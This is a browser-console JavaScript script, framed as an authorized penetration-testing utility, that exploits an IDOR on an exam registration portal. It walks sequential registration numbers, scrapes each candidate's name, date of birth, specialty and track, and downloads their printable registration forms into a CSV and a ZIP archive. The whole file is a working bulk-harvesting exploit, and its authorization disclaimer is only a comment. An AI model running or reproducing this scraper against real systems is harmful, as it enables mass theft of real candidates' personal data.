// verify-matricules-filieres.js
//
// Authorized security-testing utility: bulk-checks a range of exam
// registration numbers (matricules) against a registration portal to
// confirm whether an IDOR (Insecure Direct Object Reference) exposes
// candidate records -- including name, date of birth, specialite and
// filiere -- to any unauthenticated visitor who can guess a sequential ID.
//
// For each record found, it also follows the "Imprimer la fiche
// d'inscription" link and archives the printable fiche (PDF or HTML)
// into a single downloadable ZIP, as impact evidence for the finding.
//
// Usage: run in the browser DevTools console while on the target origin,
// inside the scope of an authorized penetration test / bug bounty
// engagement only. Do not run against systems you do not have explicit
// written authorization to test, and only collect the volume of evidence
// agreed in the engagement's rules of engagement.
//
// Adjust `debut`, `fin`, and the matricule prefix/format below to match
// the engagement's agreed test range.
(async function () {
    var debut = 1;
    var fin = 350;
    var resultat = [];

    // Libelles recherches pour chaque champ, du plus specifique au plus generique
    var champsRecherches = {
        Nom: /\bnoms?\s*(et\s*pr[ée]nom)?\b/i,
        DateNaissance: /date\s*de\s*naissance|n[ée]\(?e?\)?\s*le/i,
        Specialite: /sp[ée]cialit[ée]/i,
        Filiere: /fili[èe]re|formation/i
    };

    var lienImpressionRegex = /imprimer\s*(la)?\s*fiche\s*d.?inscription/i;

    function extraireChamp(doc, regex) {
        var elements = Array.prototype.slice.call(
            doc.querySelectorAll("input, select, textarea, td, th, label, p, span, div")
        );

        for (var i = 0; i < elements.length; i++) {
            var element = elements[i];
            var texte = element.textContent.trim();

            if (regex.test(texte)) {
                var suivant = element.nextElementSibling;
                var texteSuivant = suivant ? suivant.textContent.trim() : "";
                var valeur = element.value || texteSuivant || texte;

                if (valeur && valeur.length > 1) {
                    return valeur.replace(/\s+/g, " ").trim();
                }
            }
        }

        return "";
    }

    // Retrouve le lien "Imprimer la fiche d'inscription" (ou le bouton
    // equivalent) sur la fiche du candidat
    function extraireLienImpression(doc) {
        var liens = Array.prototype.slice.call(doc.querySelectorAll("a, button"));

        for (var i = 0; i < liens.length; i++) {
            var lien = liens[i];
            var texte = lien.textContent.trim();

            if (lienImpressionRegex.test(texte)) {
                var href = lien.getAttribute("href") || lien.getAttribute("data-href");

                if (href && href.indexOf("javascript:") !== 0 && href !== "#") {
                    return href;
                }
            }
        }

        return null;
    }

    // --- Mini-ecrivain ZIP (methode "store", sans compression, sans
    // dependance externe) pour archiver les fiches telechargees ---
    var crcTable = (function () {
        var table = [];
        for (var n = 0; n < 256; n++) {
            var c = n;
            for (var k = 0; k < 8; k++) {
                c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
            }
            table[n] = c >>> 0;
        }
        return table;
    })();

    function crc32(bytes) {
        var crc = 0xFFFFFFFF;
        for (var i = 0; i < bytes.length; i++) {
            crc = (crc >>> 8) ^ crcTable[(crc ^ bytes[i]) & 0xFF];
        }
        return (crc ^ 0xFFFFFFFF) >>> 0;
    }

    function dosDateTime(date) {
        date = date || new Date();
        var time = ((date.getHours() & 0x1F) << 11) | ((date.getMinutes() & 0x3F) << 5) | ((date.getSeconds() >> 1) & 0x1F);
        var dosDate = (((date.getFullYear() - 1980) & 0x7F) << 9) | (((date.getMonth() + 1) & 0xF) << 5) | (date.getDate() & 0x1F);
        return { time: time, dosDate: dosDate };
    }

    function ZipWriter() {
        this.chunks = [];
        this.centralDirectory = [];
        this.offset = 0;
    }

    ZipWriter.prototype.addFile = function (name, data) {
        var nameBytes = new TextEncoder().encode(name);
        var crc = crc32(data);
        var dt = dosDateTime();

        var localHeader = new Uint8Array(30 + nameBytes.length);
        var view = new DataView(localHeader.buffer);

        view.setUint32(0, 0x04034b50, true);
        view.setUint16(4, 20, true);
        view.setUint16(6, 0, true);
        view.setUint16(8, 0, true);
        view.setUint16(10, dt.time, true);
        view.setUint16(12, dt.dosDate, true);
        view.setUint32(14, crc, true);
        view.setUint32(18, data.length, true);
        view.setUint32(22, data.length, true);
        view.setUint16(26, nameBytes.length, true);
        view.setUint16(28, 0, true);
        localHeader.set(nameBytes, 30);

        this.centralDirectory.push({
            nameBytes: nameBytes,
            crc: crc,
            size: data.length,
            offset: this.offset,
            time: dt.time,
            dosDate: dt.dosDate
        });

        this.chunks.push(localHeader, data);
        this.offset += localHeader.length + data.length;
    };

    ZipWriter.prototype.finalize = function () {
        var centralChunks = [];
        var centralSize = 0;
        var centralOffset = this.offset;

        for (var i = 0; i < this.centralDirectory.length; i++) {
            var entry = this.centralDirectory[i];
            var header = new Uint8Array(46 + entry.nameBytes.length);
            var view = new DataView(header.buffer);

            view.setUint32(0, 0x02014b50, true);
            view.setUint16(4, 20, true);
            view.setUint16(6, 20, true);
            view.setUint16(8, 0, true);
            view.setUint16(10, 0, true);
            view.setUint16(12, entry.time, true);
            view.setUint16(14, entry.dosDate, true);
            view.setUint32(16, entry.crc, true);
            view.setUint32(20, entry.size, true);
            view.setUint32(24, entry.size, true);
            view.setUint16(28, entry.nameBytes.length, true);
            view.setUint16(30, 0, true);
            view.setUint16(32, 0, true);
            view.setUint16(34, 0, true);
            view.setUint16(36, 0, true);
            view.setUint32(38, 0, true);
            view.setUint32(42, entry.offset, true);
            header.set(entry.nameBytes, 46);

            centralChunks.push(header);
            centralSize += header.length;
        }

        var endRecord = new Uint8Array(22);
        var endView = new DataView(endRecord.buffer);
        endView.setUint32(0, 0x06054b50, true);
        endView.setUint16(4, 0, true);
        endView.setUint16(6, 0, true);
        endView.setUint16(8, this.centralDirectory.length, true);
        endView.setUint16(10, this.centralDirectory.length, true);
        endView.setUint32(12, centralSize, true);
        endView.setUint32(16, centralOffset, true);
        endView.setUint16(20, 0, true);

        var parts = this.chunks.concat(centralChunks, [endRecord]);
        return new Blob(parts, { type: "application/zip" });
    };

    var zip = new ZipWriter();

    function telechargerBlob(blob, nomFichier) {
        var objectUrl = URL.createObjectURL(blob);
        var lien = document.createElement("a");
        lien.href = objectUrl;
        lien.download = nomFichier;

        document.body.appendChild(lien);
        lien.click();
        lien.remove();

        // Revocation differee : sur certains navigateurs, revoquer l'URL blob
        // immediatement apres le clic annule le telechargement avant qu'il ne demarre
        setTimeout(function () { URL.revokeObjectURL(objectUrl); }, 2000);
    }

    function exporterCSV(donnees) {
        var lignes = [
            ["Matricule", "Existe", "Nom", "Date de naissance", "Specialite", "Filiere concourue", "Fiche archivee", "Lien"]
        ];
        for (var i = 0; i < donnees.length; i++) {
            var x = donnees[i];
            lignes.push([x.Matricule, x.Existe, x.Nom, x.DateNaissance, x.Specialite, x.Filiere, x.FicheArchivee, x.Lien]);
        }

        var corps = lignes.map(function (ligne) {
            return ligne.map(function (cellule) {
                return '"' + String(cellule).replace(/"/g, '""') + '"';
            }).join(";");
        }).join("\n");

        var csv = String.fromCharCode(0xFEFF) + corps;

        var debutTag = String(debut).padStart(5, "0");
        var finTag = String(fin).padStart(5, "0");

        telechargerBlob(
            new Blob([csv], { type: "text/csv;charset=utf-8;" }),
            "matricules_26SP" + debutTag + "_a_26SP" + finTag + ".csv"
        );

        console.log("Fichier CSV telecharge (" + donnees.length + " lignes)");
    }

    function exporterZIP(nombreFiches) {
        if (nombreFiches === 0) {
            console.log("Aucune fiche archivee, ZIP non genere");
            return;
        }

        var debutTag = String(debut).padStart(5, "0");
        var finTag = String(fin).padStart(5, "0");

        telechargerBlob(
            zip.finalize(),
            "fiches_inscription_26SP" + debutTag + "_a_26SP" + finTag + ".zip"
        );

        console.log("Archive ZIP telechargee (" + nombreFiches + " fiches)");
    }

    // Telecharge la fiche imprimable d'un candidat et l'ajoute au ZIP.
    // Si aucun lien d'impression distinct n'est trouve, la page du
    // candidat elle-meme (qui contient la fiche) est archivee a la place.
    async function archiverFiche(doc, html, matricule) {
        var hrefImpression = extraireLienImpression(doc);

        var octets;
        var extension;

        if (hrefImpression) {
            var urlImpression = new URL(hrefImpression, window.location.origin).href;
            var reponse = await fetch(urlImpression);
            var buffer = await reponse.arrayBuffer();
            octets = new Uint8Array(buffer);

            var typeContenu = reponse.headers.get("content-type") || "";
            extension = typeContenu.indexOf("pdf") !== -1 ? "pdf" : (typeContenu.indexOf("html") !== -1 ? "html" : "bin");
        } else {
            octets = new TextEncoder().encode(html);
            extension = "html";
        }

        zip.addFile("fiches/" + matricule + "." + extension, octets);
        return true;
    }

    console.log("Verification des matricules...");

    var fichesArchivees = 0;

    try {
        for (var i = debut; i <= fin; i++) {
            var matricule = "26SP" + String(i).padStart(5, "0");
            var url = "/registration-display-submit/SP/" + matricule;

            try {
                var response = await fetch(url);
                var html = await response.text();

                var existe = response.ok && html.indexOf(matricule) !== -1 && html.indexOf("Inscription au concours") !== -1;

                var nom = "";
                var dateNaissance = "";
                var specialite = "";
                var filiere = "";
                var ficheArchivee = "NON";

                if (existe) {
                    var doc = new DOMParser().parseFromString(html, "text/html");

                    nom = extraireChamp(doc, champsRecherches.Nom);
                    dateNaissance = extraireChamp(doc, champsRecherches.DateNaissance);
                    specialite = extraireChamp(doc, champsRecherches.Specialite);
                    filiere = extraireChamp(doc, champsRecherches.Filiere);

                    try {
                        await archiverFiche(doc, html, matricule);
                        ficheArchivee = "OUI";
                        fichesArchivees++;
                    } catch (ficheErreur) {
                        console.log("  Fiche non archivee pour " + matricule);
                    }
                }

                resultat.push({
                    Matricule: matricule,
                    Existe: existe ? "OUI" : "NON",
                    Nom: nom,
                    DateNaissance: dateNaissance,
                    Specialite: specialite,
                    Filiere: filiere,
                    FicheArchivee: ficheArchivee,
                    Lien: existe ? new URL(url, window.location.origin).href : ""
                });

                console.log(
                    i + "/" + fin + " -- " + matricule + " -> " + (existe ? "OK" : "absent") + " " + nom + " " + filiere +
                    (existe ? " [" + ficheArchivee + "]" : "")
                );

            } catch (erreur) {
                resultat.push({
                    Matricule: matricule,
                    Existe: "ERREUR",
                    Nom: "",
                    DateNaissance: "",
                    Specialite: "",
                    Filiere: "",
                    FicheArchivee: "NON",
                    Lien: ""
                });

                console.log(i + "/" + fin + " -- " + matricule + " -> ERREUR");
            }

            await new Promise(function (resolve) { setTimeout(resolve, 150); });
        }
    } finally {
        // Les exports se font meme si la boucle s'arrete sur une erreur inattendue
        exporterCSV(resultat);
        exporterZIP(fichesArchivees);

        console.log("================================");
        console.log("TERMINE");
        console.log(resultat.length + " matricules verifies");
        console.log(fichesArchivees + " fiches archivees");
        console.log("================================");

        console.table(resultat);
    }
})();
